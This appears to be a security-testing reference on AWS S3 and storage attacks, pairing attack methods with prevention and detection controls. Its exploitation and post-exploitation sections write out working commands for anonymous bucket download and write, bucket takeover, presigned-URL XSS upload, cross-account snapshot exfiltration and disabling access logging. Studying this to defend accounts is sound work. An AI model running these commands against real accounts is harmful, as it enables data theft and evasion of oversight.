# S3 and Storage Attacks

> [!CAUTION]
> This file is for authorized security testing of AWS accounts you own or have explicit written permission to assess. Do not use these techniques against accounts, resources, or services you do not own or have permission to test.

## 1. Overview

Amazon Simple Storage Service (S3) is object storage: buckets (globally unique names) contain objects (keys + data + metadata). S3 is also the single most common source of AWS data breaches, for three reasons:

1. **Bucket names are global and guessable.** Any unauthenticated client can probe `https://<name>.s3.amazonaws.com/` and learn whether a bucket exists (200 listable, 403 exists but not listable, 404 does not exist, 301 wrong region).
2. **Bucket policies are easy to misconfigure.** A single `Principal: "*"` without a condition, or an ACL `AllUsers: READ`, makes the bucket public. This is a one-line configuration error with multi-million-record consequences.
3. **Access control is dual.** S3 supports both IAM policies (identity-based) and bucket policies/ACLs (resource-based). The effective permission is the union of the two, minus explicit denies. An analyst who checks only IAM will miss a public bucket policy; an analyst who checks only the bucket policy will miss an over-broad IAM role.

This file covers the attack surface of S3 and the adjacent storage services: S3 proper, S3 access points, and the snapshot/snapshot-share surface of RDS and EBS. It does not cover the application-layer use of S3 (for example SSRF to S3 signed URLs); that lives in the IAM and compute files.

## 2. Reconnaissance / Enumeration

### 2.1 Unauthenticated bucket probing

Bucket names are global and follow a predictable pattern (`<company>-<env>-<purpose>`, `<company>-backup`, `<company>-assets`). The first reconnaissance step is name enumeration, then classification of the response code:

```bash
# Existence + accessibility check, no credentials
for name in company-prod company-backup company-assets company-logs; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://$name.s3.amazonaws.com/")
    echo "$name -> $code"
done
```

Response codes:

- `200` - bucket exists and is publicly listable. This is an immediate data-exposure finding.
- `403` - bucket exists, list denied. The bucket may still allow `GetObject` on specific keys, or accept `PutObject` from anonymous users.
- `301` - bucket exists but in a different region. The `x-amz-bucket-region` header reveals the region.
- `404` - bucket does not exist (or the name is reserved).

### 2.2 Authenticated bucket enumeration

With any credential, `s3:ListAllMyBuckets` (if permitted) returns every bucket in the account. If that permission is denied, `s3:GetBucketLocation` on a guessed name confirms existence, and `s3:ListBucket` on a specific bucket confirms list access.

```bash
# All buckets visible to the current identity
aws s3 ls

# Specific bucket: policy, ACL, encryption, versioning, logging
aws s3api get-bucket-policy --bucket <name>
aws s3api get-bucket-acl --bucket <name>
aws s3api get-bucket-encryption --bucket <name>
aws s3api get-bucket-versioning --bucket <name>
aws s3api get-bucket-logging --bucket <name>
aws s3api get-public-access-block --bucket <name>
```

### 2.3 Object-level enumeration

Once a bucket is readable, object keys are the second dimension. Common naming patterns for high-value objects: `backup/`, `db/`, `.env`, `credentials`, `id_rsa`, `*.sql`, `*.bak`, `config.json`, `terraform.tfstate`, `cloudformation/`.

```bash
# List objects (requires s3:ListBucket)
aws s3 ls s3://<bucket>/ --recursive --human-readable --summarize

# Search keys for high-value patterns
aws s3api list-objects-v2 --bucket <bucket> --query 'Contents[?contains(Key, `backup`)].Key'
```

### 2.4 Storage-adjacent surfaces

S3 is not the only storage service with a data-exposure risk:

- **RDS snapshots** - `rds:DescribeDBSnapshots` + `rds:ModifyDBSnapshotAttribute` with `restore` on an external account shares the snapshot cross-account.
- **EBS snapshots** - `ec2:DescribeSnapshots` + `ec2:ModifySnapshotAttribute` with `createVolumePermission` shares the volume cross-account.
- **EFS file systems** - `elasticfilesystem:DescribeFileSystems` + mount targets reveal NFS endpoints; if the security group allows `2049` from `0.0.0.0/0`, the file system is reachable without AWS credentials.
- **S3 access points** - `s3:ListAccessPoints` reveals named network endpoints with their own policies; an access point can be more permissive than the underlying bucket.

## 3. Common Attack Vectors

### 3.1 Public bucket policy or ACL

The classic S3 data leak. A bucket policy with `Principal: "*"` and `Action: "s3:GetObject"` without a `Condition` allows anyone on the internet to read every object. The same applies to a legacy ACL with `AllUsers: READ`. This is not a vulnerability in S3; it is a configuration choice that no reviewer caught.

### 3.2 Anonymous write to a bucket

A public bucket can also be writable. `s3:PutObject` from `Principal: "*"` allows an unauthenticated attacker to upload objects. This is worse than a read leak in three ways: it can poison data used by the application, it can host phishing content under a trusted domain, and it can serve malware with a legitimate S3 origin.

### 3.3 Bucket takeover through a dangling reference

A bucket name can be referenced by an application (`<company>-assets.s3.amazonaws.com`) and then deleted. An attacker registers the same name in their own account, and the application now serves attacker-controlled content to its users. This is the S3 equivalent of subdomain takeover.

### 3.4 Presigned URL abuse

A presigned URL is a time-limited, signed URL that grants temporary access to a specific object. It is a legitimate feature, but two misuses are common:

- **Over-broad scope.** A presigned URL for `s3:PutObject` on a bucket with a permissive CORS policy can be used to upload arbitrary content.
- **Long expiry.** A presigned URL with a one-week expiry is effectively a long-lived credential for that object. URLs leaked in logs, browser history, or chat are live for the whole window.

### 3.5 `s3:PutBucketPolicy` as privilege escalation

If an identity can call `s3:PutBucketPolicy` on a bucket that another (more privileged) identity reads from, the attacker can replace the bucket policy with one that grants read access to an attacker-controlled principal. This is not privilege escalation in the IAM sense, but it is a data-exfiltration path that bypasses the target identity's IAM restrictions.

### 3.6 Snapshot sharing

`rds:ModifyDBSnapshotAttribute` and `ec2:ModifySnapshotAttribute` share a snapshot with another AWS account. If the attacker controls the recipient account, the snapshot can be restored into a database or volume the attacker fully controls, and the data is read directly. This is a common path in real assessments because the permissions are often granted to developer roles.

## 4. Exploitation Recipes

### 4.1 Anonymous read of a public bucket

Precondition: the bucket is public (`200` on the list call, or `403` with readable objects). No AWS credentials required.

```bash
# List the bucket
curl -s "https://company-assets.s3.amazonaws.com/" | head -50

# Read a specific object
curl -s "https://company-assets.s3.amazonaws.com/config.json"

# Recursive download with the AWS CLI, no credentials (anonymous)
AWS_ACCESS_KEY_ID= AWS_SECRET_ACCESS_KEY= aws s3 cp s3://company-assets/ ./company-assets/ --recursive --no-sign-request
```

The `--no-sign-request` flag tells the AWS CLI to send an unsigned request, which is exactly what an anonymous user does. If the bucket allows public read, the download succeeds with no credentials.

### 4.2 Anonymous write to a public-writable bucket

Precondition: the bucket policy allows `s3:PutObject` from `Principal: "*"`. This is rarer than public read, but it is a critical finding when present.

```bash
# Upload a test object (do this only on buckets you are authorized to test)
echo "security-test-$(date +%s)" > /tmp/s3-write-test.txt
curl -s -X PUT --data-binary @/tmp/s3-write-test.txt \
    "https://company-assets.s3.amazonaws.com/security-test.txt" -o /dev/null -w "%{http_code}\n"
```

Expected response: `200` on success. A `403` means the write is denied (bucket is read-only public), and `404` means the bucket does not exist.

### 4.3 Bucket takeover of a dangling reference

Precondition: an application references `<company>-assets.s3.amazonaws.com`, and the bucket was deleted (or never existed). The attacker creates the bucket in their own AWS account in the same region as the application expects.

```bash
# Confirm the bucket does not exist (404)
curl -s -o /dev/null -w "%{http_code}\n" "https://company-assets.s3.amazonaws.com/"

# Create it in the attacker account (must be the same region the app expects)
aws s3api create-bucket --bucket company-assets --region us-east-1

# Enable static website hosting and upload an index.html
aws s3 website s3://company-assets/ --index-document index.html
echo "<html><body>Takeover PoC</body></html>" > index.html
aws s3 cp index.html s3://company-assets/index.html --acl public-read
```

The application now serves attacker-controlled content. This is not a vulnerability in AWS; it is an application that trusted a DNS name that nobody was monitoring.

### 4.4 Presigned URL scope escalation

Precondition: a presigned URL is issued for `s3:PutObject` on a bucket, and the bucket has a permissive CORS policy. The attacker uploads an object with a malicious content type, then serves it from the trusted S3 domain.

```bash
# Upload via the presigned URL (URL from a leaked log or browser history)
curl -s -X PUT --data-binary @payload.html \
    -H "Content-Type: text/html" \
    "<presigned-url>"

# The object is now served from https://<bucket>.s3.amazonaws.com/<key>
```

The impact depends on the bucket's CORS policy and the application's use of the object. If the application renders the object in a browser, the attacker has stored XSS under a trusted origin.

### 4.5 Cross-account snapshot exfiltration

Precondition: the current identity has `rds:ModifyDBSnapshotAttribute` (or `ec2:ModifySnapshotAttribute`) on a snapshot, and the attacker controls a second AWS account.

```bash
# Share an RDS snapshot with the attacker account
aws rds modify-db-snapshot-attribute \
    --db-snapshot-identifier <snapshot-id> \
    --attribute-name restore \
    --values-to-add 111122223333

# In the attacker account, restore the snapshot into a new database
aws rds restore-db-instance-from-db-snapshot \
    --db-instance-identifier attacker-restored \
    --db-snapshot-identifier arn:aws:rds:us-east-1:123456789012:snapshot:<snapshot-id>
```

The same pattern applies to EBS snapshots (`ec2:ModifySnapshotAttribute --attribute createVolumePermission --operation-type add --group all`) and to RDS cluster snapshots.

## 5. Post-Exploitation

After obtaining S3 access, the attacker's priorities are data volume, version history, and persistence through policy modification.

- **Data volume:** `s3:ListBucket` + `s3:GetObject` on high-value prefixes. Object versioning preserves every version of an object, so a leaked credential can read a deleted secret from an older version.
- **Version history:** `s3api list-object-versions` reveals every version of every object. If versioning is enabled, deleted objects are recoverable by an attacker with read access.
- **Persistence through policy:** `s3:PutBucketPolicy` can add an attacker-controlled principal to the bucket policy, giving durable access that survives the loss of the original credential. This is the S3 equivalent of a backdoor IAM user.
- **Logging disablement:** `s3:PutBucketLogging` with an empty configuration disables access logging, which removes the primary evidence source.

## 6. Preventive Controls

- **Block public access at the account level.** `BlockPublicAcls`, `BlockPublicPolicy`, `IgnorePublicAcls`, `RestrictPublicBuckets` all `true` on every account and every bucket, with a reviewed exception process.
- **Use bucket policies, not ACLs.** ACLs are legacy and easy to misconfigure. Disable ACLs with `ObjectOwnership: BucketOwnerEnforced`.
- **Encrypt by default.** SSE-S3 or SSE-KMS on every bucket, and a bucket policy that denies `s3:PutObject` without `s3:x-amz-server-side-encryption`.
- **Enable versioning and Object Lock** on sensitive buckets. Versioning preserves history; Object Lock prevents deletion and overwrite in a defined retention window.
- **Enforce TLS.** A bucket policy that denies `s3:*` when `aws:SecureTransport` is `false`.
- **Access Analyzer for external access.** `access-analyzer:ListFindings` on the account-level analyzer reveals buckets, roles, and KMS keys shared with external principals.
- **Restrict snapshot sharing.** `rds:ModifyDBSnapshotAttribute` and `ec2:ModifySnapshotAttribute` should be denied by SCP except for a documented account.

## 7. Detection Controls

S3 data events are not recorded by default. Enable CloudTrail data events (`s3:GetObject`, `s3:PutObject`, `s3:DeleteObject`) on sensitive buckets, and monitor the following management events:

- **`PutBucketPolicy`, `PutBucketAcl`, `DeleteBucketPolicy`, `DeleteBucketAcl`** - policy change, the strongest indicator of persistence.
- **`PutPublicAccessBlock` with `BlockPublicAcls: false`** - a deliberate weakening of the account guardrail.
- **`PutBucketLogging` with an empty configuration** - logging disablement, defense evasion.
- **`GetObject` from an unusual IP, user agent, or time** - data access anomaly (requires data events).
- **`ListBuckets` from an identity that has never listed before** - reconnaissance indicator.
- **`ModifyDBSnapshotAttribute` / `ModifySnapshotAttribute` with an external account ID** - cross-account exfiltration.
- **`CreateBucket` for a bucket name that matches an application's dangling reference** - takeover indicator (hard to detect at the AWS layer; monitor DNS and application logs).

GuardDuty findings that overlap: `Discovery:S3/AnomalousBehavior`, `Exfiltration:S3/AnomalousBehavior`, `Impact:S3/AnomalousBehavior`, `UnauthorizedAccess:S3/MaliciousIPCaller.Custom`, `Policy:S3/BucketAnonymousAccessGranted`, `Policy:S3/BucketPublicAccessGranted`.

## 8. Verification

Read-only checks to confirm the preventive controls are in place:

```bash
# Account-level public access block
aws s3control get-public-access-block --account-id $(aws sts get-caller-identity --query 'Account' --output text)

# Per-bucket encryption, versioning, public access block, ownership
for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
    echo "=== $b ==="
    aws s3api get-bucket-encryption --bucket "$b" --query 'ServerSideEncryptionConfiguration.Rules[0].ApplyServerSideEncryptionByDefault.SSEAlgorithm' --output text 2>/dev/null
    aws s3api get-bucket-versioning --bucket "$b" --query 'Status' --output text 2>/dev/null
    aws s3api get-public-access-block --bucket "$b" 2>/dev/null
done

# External access findings
aws accessanalyzer list-findings --analyzer-name <analyzer-name> --query 'findings[?status==`ACTIVE`]'
```

Expected result: every bucket has an encryption algorithm, versioning `Enabled` or `Suspended` (not empty), and a public access block with all four flags `true`. Access Analyzer returns no `ACTIVE` findings with `isPublic: true` on sensitive buckets.

## 9. Certification Alignment

- **AWS Certified Solutions Architect - Associate** - S3 storage classes, bucket policies, ACLs, encryption, versioning, lifecycle rules.
- **AWS Certified Security - Specialty** - S3 access control, Access Analyzer, CloudTrail data events, Macie findings.
- **CompTIA Security+** - data protection, encryption at rest and in transit, access control.

## 10. Production Notes

- S3 bucket names are globally unique and permanently reserved after deletion, in most cases. A deleted bucket name is not immediately available for re-registration, but the window depends on the name's age and the region; an application that depends on a deleted bucket name is still fragile.
- S3 access logging is best-effort and delivered with delay. CloudTrail data events are the authoritative record but are charged per event; use them selectively.
- Object Lock requires versioning and cannot be disabled once enabled for a bucket. Use it only where a compliance requirement demands it.
- CORS configuration on a bucket is a security control, not just a browser convenience. A wildcard `AllowedOrigin: "*"` combined with `AllowedMethods: ["PUT"]` is a write primitive for any web page.
- Access Analyzer is per-region and per-account for most finding types; use an organization-level analyzer for cross-account coverage.

## 11. References

- Amazon S3 User Guide - https://docs.aws.amazon.com/AmazonS3/latest/userguide/
- S3 Block Public Access - https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html
- S3 security best practices - https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html
- IAM Access Analyzer - https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html
- Amazon GuardDuty S3 protection - https://docs.aws.amazon.com/guardduty/latest/ug/s3-protection.html
- CloudTrail S3 data events - https://docs.aws.amazon.com/awscloudtrail/latest/userguide/logging-data-events-with-cloudtrail.html
